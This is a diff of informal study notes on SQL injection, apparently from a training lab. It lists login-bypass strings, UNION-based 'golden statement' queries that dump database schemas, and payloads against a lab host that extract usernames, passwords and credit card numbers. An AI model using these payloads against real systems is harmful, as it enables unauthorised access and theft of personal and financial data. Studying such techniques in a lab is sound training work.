@@ -49,7 +49,6 @@ select name,size,cosr from session.tires ;
 https://sqlbolt.com/lesson/select_queries_introduction
 
 # login/auth bypass
-'
 login:  ' OR 1='1
 passw:  ' OR 1='1
 go into web dev
@@ -70,8 +69,8 @@ once identified, test for my columns
 audi 'UNION SELECT 1,2,3,4,5 #
  golden statement
  UNION SELECT table_schema,table_name,column_name from information_schema.columns #
-# edit goldne statemtn
 
+# edit goldne statemtn
 Audi ' UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns #
 Audi ' UNION SELECT type,2,cost,color,year from session.car #
 Audi ' UNION SELECT carid,2,type,name,year from session.car #
@@ -88,6 +87,7 @@ session
           rgagasd
           gasgdsa
           werqsa
+          
 ## step one id vulnerable field bt fuzzing (get method)
 pay attention to url and what changes with each selection
 http://10.50.36.14/uniondemo.php?Selectionhttp://10.50.36.14/uniondemo.php?Selection=2%20UNION%20SELECT%20id,name,pass%20from%20session.user=4 OR 1=1
@@ -98,16 +98,63 @@ http://10.50.36.14/uniondemo.php?Selection=2 UNION SELECT 1,2,3
  Displayed 1,3,2
 
 ## step 3 edit golden statement to dump database (same as post method)
-
 copy golden statement but swap table name and column name to format correctly
  UNION SELECT table_schema,table_name,column_name from information_schema.columns 
  UNION SELECT table_schema,column_name,table_name from information_schema.columns 
 pass the golden statemnet after the selection=2 into url 
 10.50.36.14/uniondemo.php?Selection=2 UNION SELECT table_schema,column_name,table_name from information_schema.columns
+
 ## step 4 craft queries get mone
 10.50.36.14/uniondemo.php?Selection=2 UNION SELECT id,name,@@version from information_schema.columns
 http://10.50.36.14/uniondemo.php?Selection=2%20UNION%20SELECT%20id,name,pass%20from%20session.user
 input validation is the biggest defense against this in the fmf 
+
+### activity op notes
+
+ram 'UNION SELECT table_schema,table_name from information_schema.columns#
+
+ram 'UNION SELECT table_name, column_name from information_schema.columns#
+
+ram 'UNION SELECT permission, username from sqlinjection.members#
+
+ram 'UNION SELECT username, password from sqlinjection.members#
+
+ram 'UNION SELECT permission, username from sqlinjection.members#
+
+ram 'UNION SELECT 1, id from sqlinjection.categories# <- not 1337
+
+ram 'UNION SELECT 1, id from sqlinjection.orderlines#
+
+ram 'UNION SELECT 1, id from sqlinjection.orders#
+
+ram 'UNION SELECT 1, id from sqlinjection.payments#
+
+ram 'UNION SELECT 1, id from sqlinjection.permissions#
+
+ram 'UNION SELECT 1, id from sqlinjection.products#
+
+ram 'UNION SELECT 1, 2 id from sqlinjection.share4#
+
+ram 'UNION SELECT 1, creditcard_number from sqlinjection.payments#
+
+ram 'UNION SELECT 1, @@version from sqlinjection.payments#
+
+ram 'UNION SELECT name, id from sqlinjection.products#
+
+ram 'UNION SELECT description, price from sqlinjection.products#
+
+ram 'UNION SELECT qty_left, category from sqlinjection.products#
+
+
+golden statement 
+UNION SELECT table_schema,table_name,column_name from information_schema.columns #
+
+information_schema
+	->Tables
+		->columns
+			->table_schema
+			->table_name
+			->column_name
 
 
 
